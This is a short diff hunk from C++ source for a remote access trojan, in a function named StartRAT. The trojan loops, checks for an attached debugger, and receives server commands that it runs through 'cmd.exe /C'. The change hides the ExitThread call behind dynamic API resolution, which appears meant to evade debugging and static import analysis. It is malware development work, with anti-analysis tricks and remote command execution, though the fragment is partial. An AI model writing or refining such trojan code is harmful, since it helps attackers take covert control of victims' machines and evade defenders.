@@ -13,7 +13,7 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 	while (true)
 	{
 		if (resolve_dynamically<IsDebuggerPresent_t>("IsDebuggerPresent")() || isDebuggerAttached())
-			ExitThread(0);
+			resolve_dynamically<ExitThread_t>("ExitThread")(0);
 
 		// recv command from server
 		std::string commandLine = "cmd.exe /C ";
